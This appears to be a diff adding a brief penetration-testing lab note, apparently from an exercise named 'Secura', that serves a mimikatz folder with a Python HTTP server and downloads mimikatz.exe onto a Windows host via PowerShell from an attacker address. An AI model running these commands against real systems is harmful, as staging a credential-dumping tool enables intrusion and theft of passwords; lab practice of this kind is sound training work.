@@ -1,0 +1,5 @@
+cd /path/to/mimikatz
+python3 -m http.server 80
+
+Powershell:
+Invoke-WebRequest -Uri http://192.168.45.180/Secura/mimikatz/x64/mimikatz.exe -OutFile C:\Users\Public\mimikatz64.exe
